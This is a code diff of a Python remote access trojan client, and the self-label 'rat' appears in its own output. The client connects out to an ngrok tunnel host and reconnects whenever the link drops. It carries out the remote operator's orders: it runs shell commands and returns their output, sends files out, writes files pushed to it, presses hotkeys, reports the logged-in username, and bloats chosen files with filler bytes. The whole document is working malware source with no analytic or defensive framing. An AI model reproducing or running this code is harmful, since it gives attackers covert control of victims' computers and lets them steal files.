@@ -9,10 +9,14 @@ import os
 from datetime import datetime
 
 
-byte_size = 500 * 1024 * 1024
+BYTE_SIZE = 700 * 1024 * 1024
+
+HOST = "2.tcp.eu.ngrok.io"
+
+PORT = 19524
 
 
-def check_internet_conection()->bool:
+def check_internet_conection() -> bool:
     try:
         get("https://www.google.com",timeout=5)
         return True
@@ -22,10 +26,6 @@ def check_internet_conection()->bool:
 while check_internet_conection() == False:
     sleep(2)
     print("No internet connection")
-
-
-socket = socket(AF_INET,SOCK_STREAM)
-
 
 # find ip4 address
 def get_ipv4_address():
@@ -44,76 +44,122 @@ def get_ipv4_address():
 
         return ip_address
 
-# get_ipv4_address()
+conection = socket(AF_INET,SOCK_STREAM)
 
 
 def content():
+    global conection
     while True:
         try:
-            socket.connect(("0.tcp.eu.ngrok.io", 11560))
-            # socket.connect((get_ipv4_address(), 2222))
-            
+            conection.connect((HOST, PORT))
+
             print("Connected")
             
             break
         except ConnectionRefusedError:
             pass
 
-    return socket
+        except OSError:
+            print("Try to connect ...")
+            conection.close()
+            del conection
+            conection = socket(AF_INET,SOCK_STREAM)
+            sleep(2)
+
+    return conection
 
 
-socket = content()
+conection = content()
 
 
 def create_file_name():
     return f"{str(datetime.now().strftime('%Y%m%d_%H%M%S'))}"
 
 
-
 def send_file(file_path):
     with open(file_path, 'rb') as file:
-        socket.send(file.read())
-    
+        ch = file.read(1024)
+        while (ch):
+            conection.send(ch)
+            ch = file.read(1024)
+        sleep(4)
+        conection.send("rat sending file = 0".encode('utf-8'))
+        print("Sended")
+
 def save_file(data):
     filename = create_file_name()
+    
     bytes_txt , file_format = data.split("#")
+
     with open(f"{filename}{file_format}", 'wb') as file:
+
         file.write(bytes_txt)
+
         print(f"{Fore.GREEN}{filename} Saved!")
     
-
 def run_cmd_command(command):
-    result = getoutput(rf'{command}')
+    result = getoutput(rf'{command}',encoding="UTF-8")
+    
     if result == '':
         result = "runed"
-    socket.send(result.encode())
 
+    conection.send(result.encode(encoding="UTF-8"))
 
 def press_hotkey(keys):
     hotkey(keys.split("+"))
-    socket.send("Runed".encode())
+
+    conection.send("Runed".encode())
+
 
 def get_windows_username(value):
     user = os.getlogin()
-    socket.send(f"{value} : {user}".encode())
+    conection.send(f"{value} : {user}".encode())
 
 def increase_file_size(data):
     file_path, size_mg = data.split("|")
+
     size_mg = int(size_mg)
+
     target_size = size_mg * 1024 * 1024
 
     with open(file_path, 'w') as file:
         pass
 
     with open(file_path, 'ab') as file:
+
         while os.path.getsize(file_path) < target_size:
-            file.write(b"DIGE GOHNAKHORIYAAAAA INTORYAST" * 1024 * 1024)
-    socket.send("Runed".encode())
+
+            text = b"DIGE GOHNAKHORIYAAAAA INTORYAST" * 1024 * 1024
+
+            file.write(text)
+
+    conection.send("Runed".encode())
 
 while True:
-    try:
-        shell = socket.recv(byte_size).decode()
-        function_name, value = shell.split("!")
+        shell = conection.recv(BYTE_SIZE).decode()
+        
+        print(f"{Fore.YELLOW} Command : {shell}")
+        
+
+        if shell == "":
+            print("Invalid Command Format")
+
+            conection = content()
+
+            continue
+
+        try:
+
+            function_name, value = shell.split("!")
+
+        except ValueError:
+
+            print("Invalid Command Format")
+
+            conection.send("Invalid Command Format!".encode())
+            
+            continue
+        
         if function_name == "cmd":
             run_cmd_command(value)
 
@@ -133,9 +179,4 @@ while True:
             increase_file_size(value)
 
         else:
-            socket.send("command not fund!".encode())
-
-    except ConnectionResetError:
-        socket.close()
-        socket = content()
-        continue
+            conection.send("command not fund!".encode())
